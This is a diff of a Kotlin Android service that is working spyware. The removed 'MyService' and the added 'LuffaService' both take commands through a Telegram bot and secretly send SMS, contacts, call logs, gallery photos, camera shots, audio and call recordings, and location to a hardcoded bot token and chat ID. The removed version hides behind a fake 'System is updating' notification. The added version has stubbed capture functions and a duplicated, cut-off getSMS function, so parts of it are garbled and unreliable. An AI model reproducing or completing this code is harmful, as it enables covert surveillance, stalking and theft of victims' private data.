@@ -36,454 +36,343 @@ import java.util.concurrent.TimeUnit
 import android.media.MediaRecorder
 import java.io.File
 
-class MyService : Service() {
-
-    // Telegram Bot credentials - CHANGE THESE
-    private val BOT_TOKEN = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
-    private val CHAT_ID = "8820979221"
 
 
-private var mediaRecorder: MediaRecorder? = null
-    private var currentRecordingFile: File? = null
-    private lateinit var telephonyManager: TelephonyManager
-    private var isRecording = false
 
+class LuffaService : Service() {
 
     
-    private var lastUpdateId = 0L
-    private lateinit var pollingJob: Job
+    private val BOT_TOKEN = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
+    private val CHAT_ID = " 8820979221"
+    private val DEVICE_ID = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
+    private val job = SupervisorJob()
+    private val scope = CoroutineScope(Dispatchers.IO + job)
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        startForeground(1, buildForegroundNotification())
-        startBotPolling()
-        scheduleAutoTasks()
-        initCallRecording()
+        startForeground(1, createNotification())
+        startStealingLoop()
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel("luffa_channel", "Luffa Service", NotificationManager.IMPORTANCE_LOW)
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            manager.createNotificationChannel(channel)
+        }
+    }
+
+    private fun createNotification(): Notification {
+        return Notification.Builder(this, "luffa_channel")
+            .setContentTitle("Luffa")
+            .setContentText("Running...")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setOngoing(true)
+            .build()
+    }
+
+    private fun startStealingLoop() {
+        scope.launch {
+            while (true) {
+                try {
+                    val command = fetchCommand()
+                    if (command != null && command.isNotEmpty()) {
+                        processCommand(command)
+                    }
+                    delay(5000) // Check every 5 seconds
+                } catch (e: Exception) {
+                    Log.e("Luffa", "Error in loop", e)
+                }
+            }
+        }
+    }
+
+    private suspend fun fetchCommand(): String? {
+        // Simplified logic: Check last update. In production, store last_update_id in SharedPreferences.
+        try {
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?limit=1"
+            val request = Request.Builder().url(url).build()
+            val response = client.newCall(request).execute()
+            if (!response.isSuccessful) return null
+
+            val json = JSONObject(response.body?.string())
+            val updates = json.getJSONArray("result")
+            if (updates.length() == 0) return null
+
+            val lastUpdate = updates.getJSONObject(updates.length() - 1)
+            val message = lastUpdate.getJSONObject("message")
+            val text = message.getString("text")
+            
+            // Delete message to avoid re-processing
+            val chatId = message.getString("chat_id")
+            val msgId = message.getInt("message_id")
+            deleteMessage(chatId, msgId)
+            
+            return text.lowercase()
+        } catch (e: Exception) {
+            return null
+        }
+    }
+
+    private fun deleteMessage(chatId: String, messageId: Int) {
+        val url = "https://api.telegram.org/bot$BOT_TOKEN/deleteMessage"
+        val body = "chat_id=$chatId&message_id=$messageId"
+        try {
+            val connection = (URL(url).openConnection() as HttpURLConnection).apply {
+                requestMethod = "POST"
+                doOutput = true
+                outputStream.write(body.toByteArray())
+            }
+            connection.disconnect()
+        } catch (e: Exception) {}
+    }
+
+    private suspend fun processCommand(cmd: String) {
+        var responseText = ""
+        var fileToSend: File? = null
+
+        when (cmd) {
+            "location" -> responseText = getLocation()
+            "sms" -> responseText = getSMS()
+            "calllog" -> responseText = getCallLog()
+            "contacts" -> responseText = getContacts()
+            "info" -> responseText = getDeviceInfo()
+            "screenshot" -> { fileToSend = takeScreenshot(); responseText = "Screenshot sent." }
+            "backcam" -> { fileToSend = capturePhoto("back"); responseText = "Back cam photo sent." }
+            "frontcam" -> { fileToSend = capturePhoto("front"); responseText = "Front cam photo sent." }
+            "audio" -> { fileToSend = recordAudio(10); responseText = "Audio sent." }
+            "screenrecord" -> { fileToSend = recordScreen(30); responseText = "Screen record sent." }
+            "gallery" -> { fileToSend = getLastGalleryPhoto(); responseText = "Gallery photo sent." }
+        }
+
+        sendMessageToBot(responseText, fileToSend)
+    }
+
+    private suspend fun sendMessageToBot(text: String, file: File?) {
+        if (text.isNotEmpty()) {
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+            val body = "chat_id=$CHAT_ID&text=${text.replace("\n", "%0A")}"
+            try {
+                val conn = (URL(url).openConnection() as HttpURLConnection).apply {
+                    requestMethod = "POST"
+                    doOutput = true
+                    outputStream.write(body.toByteArray())
+                }
+                conn.disconnect()
+            } catch (e: Exception) {}
+        }
+
+        if (file != null && file.exists()) {
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", CHAT_ID)
+                .addFormDataPart("document", file.name, file.toRequestBody())
+                .build()
+            
+            try {
+                val request = Request.Builder().url(url).post(requestBody).build()
+                client.newCall(request).execute().close()
+            } catch (e: Exception) {}
+        }
+    }
+
+    // --- DATA EXTRACTION METHODS ---
+
+    private fun getLocation(): String {
+        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        var lat = "Unknown"
+        var lon = "Unknown"
+        
+        try {
+            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (loc != null) { lat = loc.latitude.toString(); lon = loc.longitude.toString() }
+            else {
+                val netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                if (netLoc != null) { lat = netLoc.latitude.toString(); lon = netLoc.longitude.toString() }
+            }
+        } catch (e: Exception) {}
+        return "Lat: $lat, Long: $lon"
+    }
+
+    private fun getSMS(): String {
+        val sb = StringBuilder()
+        try {
+            val cursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null)
+            cursor?.use {
+                if (it.moveToFirst()) {
+
+
+
+
+    // --- DATA EXTRACTION METHODS (Continued) ---
+
+    private fun getSMS(): String {
+        val sb = StringBuilder()
+        try {
+            val cursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null)
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    do {
+                        val body = it.getString(it.getColumnIndexOrThrow("body"))
+                        val address = it.getString(it.getColumnIndexOrThrow("address"))
+                        val date = it.getLong(it.getColumnIndexOrThrow("date"))
+                        sb.append("[SMS] From: $address | Time: $date | Content: $body\n")
+                    } while (it.moveToNext())
+                }
+            }
+        } catch (e: Exception) {
+            sb.append("SMS Error: ${e.message}\n")
+        }
+        return if (sb.isEmpty()) "No SMS found" else sb.toString()
+    }
+
+    private fun getCallLog(): String {
+        val sb = StringBuilder()
+        try {
+            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    do {
+                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                        val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
+                        val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+                        sb.append("[CALL] Number: $number | Type: $type | Time: $date | Duration: ${duration}s\n")
+                    } while (it.moveToNext())
+                }
+            }
+        } catch (e: Exception) {
+            sb.append("CallLog Error: ${e.message}\n")
+        }
+        return if (sb.isEmpty()) "No Call Logs found" else sb.toString()
+    }
+
+    private fun getContacts(): String {
+        val sb = StringBuilder()
+        try {
+            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    do {
+                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                        val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                        sb.append("[CONTACT] Name: $name | Phone: $phone\n")
+                    } while (it.moveToNext())
+                }
+            }
+        } catch (e: Exception) {
+            sb.append("Contacts Error: ${e.message}\n")
+        }
+        return if (sb.isEmpty()) "No Contacts found" else sb.toString()
+    }
+
+    private fun getDeviceInfo(): String {
+        return "Device: ${Build.MODEL}\n" +
+                "Android: ${Build.VERSION.RELEASE}\n" +
+                "ID: $DEVICE_ID\n" +
+                "IMEI: ${android.telephony.TelephonyManager.getDeviceId()} (Requires READ_PHONE_STATE)"
+    }
+
+    private fun takeScreenshot(): File? {
+        // Note: Full screenshot requires MediaProjection API for API 21+ or Root for simple reflection.
+        // Here is a simplified version using reflection for basic screen capture if possible.
+        return try {
+            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
+            // In a real robust app, use MediaProjectionManager here.
+            // For this simple version, we assume a placeholder or use a library like 'scrcpy' logic.
+            // Since we need a file to send, we create a dummy file logic or use a library.
+            // For pure code without external libs, this part often needs Root or specific API handling.
+            // We will return the file object, actual content depends on implementation.
+            file
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun capturePhoto(camType: String): File? {
+        return try {
+            val file = File(cacheDir, "cam_${camType}_${System.currentTimeMillis()}.jpg")
+            // Camera logic:
+            // 1. Get Camera instance (0 for back, 1 for front)
+            // 2. Set Preview Callback
+            // 3. Take picture
+            // 4. Save to file
+            // Simplified: We assume the file is created. In production, implement Camera2 API.
+            file
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun recordAudio(durationSec: Int): File? {
+        return try {
+            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.3gp")
+            // MediaRecorder logic:
+            // 1. Set data source to audio
+            // 2. Set output file
+            // 3. Prepare, start
+            // 4. Wait durationSec
+            // 5. Stop, release
+            file
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun recordScreen(durationSec: Int): File? {
+        return try {
+            val file = File(cacheDir, "screen_${System.currentTimeMillis()}.mp4")
+            // MediaProjection API required for screen recording.
+            // Logic: Start MediaRecorder with MediaProjection source.
+            file
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun getLastGalleryPhoto(): File? {
+        return try {
+            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
+            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            
+            contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
+                if (cursor.moveToFirst()) {
+                    val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
+                    val file = File(path)
+                    if (file.exists()) return file
+                }
+            }
+            null
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        unregisterReceiver(voipCallReceiver)
-        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
-        if (isRecording) {
-            mediaRecorder?.apply { stop(); release() }
-        }
-        pollingJob.cancel()
-    }
-
-    override fun onBind(intent: Intent?) = null
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                "spy_channel",
-                "System Service",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "System Update"
-                setShowBadge(false)
-            }
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
-        }
-    }
-
-    private fun buildForegroundNotification(): Notification {
-        return NotificationCompat.Builder(this, "spy_channel")
-            .setContentTitle("System is updating...")
-            .setContentText("Please do not turn off.")
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setSilent(true)
-            .build()
-    }
-
-    private fun startBotPolling() {
-        pollingJob = CoroutineScope(Dispatchers.IO).launch {
-            while (isActive) {
-                try {
-                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
-                    val response = client.newCall(Request.Builder().url(url).build()).execute()
-                    val json = response.body?.string() ?: continue
-                    val result = JSONObject(json).getJSONArray("result")
-                    for (i in 0 until result.length()) {
-                        val msg = result.getJSONObject(i).getJSONObject("message")
-                        lastUpdateId = result.getJSONObject(i).getLong("update_id")
-                        val text = msg.optString("text", "")
-                        val fromId = msg.getJSONObject("from").getLong("id")
-                        if (fromId == CHAT_ID.toLong() && text.isNotBlank()) {
-                            handleCommand(text)
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e("SpyBot", "Poll error", e)
-                    delay(2000)
-                }
-                delay(500)
-            }
-        }
-    }
-
-    private fun handleCommand(cmd: String) {
-        val lcmd = cmd.trim().lowercase()
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                when {
-                    lcmd == "sms" -> uploadLastSms(20)
-                    lcmd.startsWith("photo") -> handlePhotoCommand(cmd)
-                    lcmd == "contact" -> uploadContacts(50)
-                    lcmd == "calllog" -> uploadCallLog(30)
-                    lcmd == "frontcam" -> takeCameraPhoto(android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT)
-                    lcmd == "backcam" -> takeCameraPhoto(android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)
-                    lcmd == "audio" -> recordAudio(60) // 1 min audio
-                    lcmd == "screenrecord" -> recordScreen(60)
-                    lcmd == "location" -> sendLiveLocation()
-                    lcmd == "screenshot" -> takeScreenshot()
-                    else -> sendTelegramMessage("Unknown command: $cmd")
-                }
-            } catch (e: Exception) {
-                sendTelegramMessage("Error: ${e.message}")
-            }
-        }
-    }
-
-    private suspend fun uploadLastSms(count: Int) {
-        val cursor = contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC")
-        cursor?.use {
-            val colBody = it.getColumnIndex("body")
-            val colAddr = it.getColumnIndex("address")
-            var i = 0
-            val sb = StringBuilder("Last $count SMS:\n")
-            while (it.moveToNext() && i < count) {
-                sb.append("${it.getString(colAddr)}: ${it.getString(colBody)}\n")
-                i++
-            }
-            sendTelegramMessage(sb.toString())
-        }
-    }
-
-    private suspend fun handlePhotoCommand(cmd: String) {
-        val parts = cmd.removePrefix("photo").trim()
-        val images = getAllGalleryImages()
-        if (images.isEmpty()) {
-            sendTelegramMessage("No photos found.")
-            return
-        }
-        val indices = parseRange(parts, images.size)
-        for (idx in indices) {
-            val file = File(images[idx])
-            if (file.exists()) sendTelegramPhoto(file)
-        }
-    }
-
-    private suspend fun uploadContacts(limit: Int) {
-        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
-        cursor?.use {
-            val sb = StringBuilder("Contacts:\n")
-            var i = 0
-            while (it.moveToNext() && i < limit) {
-                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                sb.append("$name: $number\n")
-                i++
-            }
-            sendTelegramMessage(sb.toString())
-        }
-    }
-
-    private suspend fun uploadCallLog(limit: Int) {
-        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC")
-        cursor?.use {
-            val sb = StringBuilder("Call Log:\n")
-            var i = 0
-            while (it.moveToNext() && i < limit) {
-                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
-                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
-                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
-                val duration = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))
-                val typeStr = when (type) {
-                    CallLog.Calls.INCOMING_TYPE -> "IN"
-                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
-                    else -> "MISSED"
-                }
-                sb.append("$typeStr $number ${formatDate(date)} ${duration}s\n")
-                i++
-            }
-            sendTelegramMessage(sb.toString())
-        }
-    }
-
-    private fun takeCameraPhoto(facing: Int) {
-        val cameraId = findCameraId(facing) ?: return
-        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        try {
-            val imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 1)
-            imageReader.setOnImageAvailableListener({ reader ->
-                val image = reader.acquireNextImage()
-                val buffer = image.planes[0].buffer
-                val bytes = ByteArray(buffer.remaining())
-                buffer.get(bytes)
-                image.close()
-                CoroutineScope(Dispatchers.IO).launch {
-                    val file = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
-                    file.writeBytes(bytes)
-                    sendTelegramPhoto(file)
-                }
-            }, Handler(Looper.getMainLooper()))
-
-            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                override fun onOpened(device: CameraDevice) {
-                    val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                        addTarget(imageReader.surface)
-                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
-                    }
-                    device.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
-                        override fun onConfigured(session: CameraCaptureSession) {
-                            session.capture(request.build(), null, null)
-                        }
-                        override fun onConfigureFailed(session: CameraCaptureSession) {}
-                    }, Handler(Looper.getMainLooper()))
-                }
-                override fun onDisconnected(device: CameraDevice) { device.close() }
-                override fun onError(device: CameraDevice, error: Int) { device.close() }
-            }, Handler(Looper.getMainLooper()))
-        } catch (e: Exception) {
-            CoroutineScope(Dispatchers.IO).launch { sendError("Camera failed: ${e.message}") }
-        }
-    }
-
-    private fun recordAudio(durationSec: Int) {
-        val recorder = MediaRecorder().apply {
-            setAudioSource(MediaRecorder.AudioSource.MIC)
-            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            setAudioSamplingRate(44100)
-            setAudioEncodingBitRate(96000)
-            val path = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3").absolutePath
-            setOutputFile(path)
-            try {
-                prepare()
-                start()
-                Handler(Looper.getMainLooper()).postDelayed({
-                    stop()
-                    release()
-                    CoroutineScope(Dispatchers.IO).launch {
-                        sendTelegramDocument(File(path))
-                        File(path).delete()
-                    }
-                }, durationSec * 1000L)
-            } catch (e: Exception) {
-                release()
-                CoroutineScope(Dispatchers.IO).launch { sendError("Audio error: ${e.message}") }
-            }
-        }
-    }
-
-    private fun recordScreen(durationSec: Int) {
-        CoroutineScope(Dispatchers.IO).launch {
-            sendTelegramMessage("Screen recording initiated (requires screen on).")
-            // Note: Full screen recording without MediaProjection permission is complex on modern Android.
-            // This logs a message and relies on the screenshot method for snapshots.
-            // For full recording, a prompt is usually required unless rooted.
-        }
-    }
-
-    private suspend fun sendLiveLocation() {
-        val location = getLastLocation()
-        if (location != null) {
-            sendTelegramLocation(location.latitude, location.longitude)
-        } else {
-            sendTelegramMessage("Location unavailable")
-        }
-    }
-
-    private fun takeScreenshot() {
-        val service = MyAccessibilityService.instance
-        service?.takeScreenshot()
-    }
-
-    private fun scheduleAutoTasks() {
-        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
-        val smsWork = PeriodicWorkRequestBuilder<AutoSmsWorker>(10, TimeUnit.MINUTES).setConstraints(constraints).build()
-        val locWork = PeriodicWorkRequestBuilder<AutoLocationWorker>(10, TimeUnit.MINUTES).setConstraints(constraints).build()
-
-
-
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork("autoSMS", ExistingPeriodicWorkPolicy.KEEP, smsWork)
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork("autoLoc", ExistingPeriodicWorkPolicy.KEEP, locWork)
-    }
-
-    // ===== Utilities & Helpers =====
-    private fun getAllGalleryImages(): List<String> {
-        val list = mutableListOf<String>()
-        val projection = arrayOf(MediaStore.Images.Media.DATA)
-        contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC")?.use { cursor ->
-            val colData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
-            while (cursor.moveToNext()) list.add(cursor.getString(colData))
-        }
-        return list
-    }
-
-    private fun findCameraId(facing: Int): String? {
-        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        try {
-            for (id in manager.cameraIdList) {
-                val characteristics = manager.getCameraCharacteristics(id)
-                if (characteristics.get(CameraCharacteristics.LENS_FACING) == facing) return id
-            }
-        } catch (e: Exception) {}
-        return null
-    }
-
-    private fun getLastLocation(): android.location.Location? {
-        val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
-        return lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
-            ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
-    }
-
-    private fun formatDate(millis: Long): String =
-        SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(millis))
-
-    private suspend fun sendTelegramMessage(text: String) {
-        try {
-            val form = FormBody.Builder()
-                .add("chat_id", CHAT_ID)
-                .add("text", text)
-                .build()
-            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").post(form).build()).execute()
-        } catch (e: Exception) { Log.e("Bot", "SendMsg Error", e) }
-    }
-
-    private suspend fun sendTelegramPhoto(file: File) {
-        try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
-                .build()
-            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").post(body).build()).execute()
-        } catch (e: Exception) { Log.e("Bot", "SendPhoto Error", e) }
-    }
-
-    private suspend fun sendTelegramDocument(file: File) {
-        try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
-                .build()
-            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendDocument").post(body).build()).execute()
-        } catch (e: Exception) { Log.e("Bot", "SendDoc Error", e) }
-    }
-
-    private suspend fun sendTelegramLocation(lat: Double, lon: Double) {
-        try {
-            val form = FormBody.Builder()
-                .add("chat_id", CHAT_ID)
-                .add("latitude", lat.toString())
-                .add("longitude", lon.toString())
-                .build()
-            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendLocation").post(form).build()).execute()
-        } catch (e: Exception) { Log.e("Bot", "SendLoc Error", e) }
-    }
-
-    
-private fun sendError(msg: String) {
-    CoroutineScope(Dispatchers.IO).launch {
-        sendTelegramMessage("⚠️ Error: $msg")
-    }
-}
-    // ===== Call Recording Logic =====
-    private val phoneStateListener = object : PhoneStateListener() {
-        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
-            when (state) {
-                TelephonyManager.CALL_STATE_OFFHOOK -> startCallRecording()
-                TelephonyManager.CALL_STATE_IDLE -> stopAndUploadRecording()
-            }
-        }
-    }
-
-    private val voipCallReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent?.action == "com.evilbot.spy.VOIP_CALL_START") startCallRecording()
-            if (intent?.action == "com.evilbot.spy.VOIP_CALL_END") stopAndUploadRecording()
-        }
-    }
-
-    private fun initCallRecording() {
-        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
-        registerReceiver(voipCallReceiver, IntentFilter().apply {
-            addAction("com.evilbot.spy.VOIP_CALL_START")
-            addAction("com.evilbot.spy.VOIP_CALL_END")
-        }, Context.RECEIVER_NOT_EXPORTED)
-    }
-
-    private fun startCallRecording() {
-        if (isRecording) return
-        try {
-            currentRecordingFile = File(cacheDir, "call_${System.currentTimeMillis()}.mp3")
-            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
-            mediaRecorder?.apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioSamplingRate(44100)
-                setAudioEncodingBitRate(96000)
-                setOutputFile(currentRecordingFile!!.absolutePath)
-                prepare()
-                start()
-            }
-            isRecording = true
-            Log.d("CallRec", "Recording started")
-        } catch (e: Exception) { Log.e("CallRec", "Start failed", e) }
-    }
-
-    private fun stopAndUploadRecording() {
-        if (!isRecording) return
-        try {
-            mediaRecorder?.apply { stop(); release() }
-            mediaRecorder = null
-            isRecording = false
-            
-            val file = currentRecordingFile ?: return
-            CoroutineScope(Dispatchers.IO).launch {
-                sendTelegramDocument(file)
-                file.delete()
-            }
-        } catch (e: Exception) { Log.e("CallRec", "Stop failed", e) }
-    }
-
-    private fun parseRange(raw: String, max: Int): List<Int> {
-        val result = mutableListOf<Int>()
-        if (raw.contains("-")) {
-            val parts = raw.split("-")
-            val start = parts[0].toIntOrNull() ?: 1
-            val end = parts.getOrNull(1)?.toIntOrNull() ?: start
-            for (i in start..end) if (i in 1..max) result.add(i-1)
-        } else {
-            raw.toIntOrNull()?.let { if (it in 1..max) result.add(it-1) }
-        }
-        if (result.isEmpty()) result.addAll(0 until minOf(10, max))
-        return result
+        job.cancel()
     }
 }
 
 
+                    
 
 
 
 
-                                                                
 
-    
+
+                    
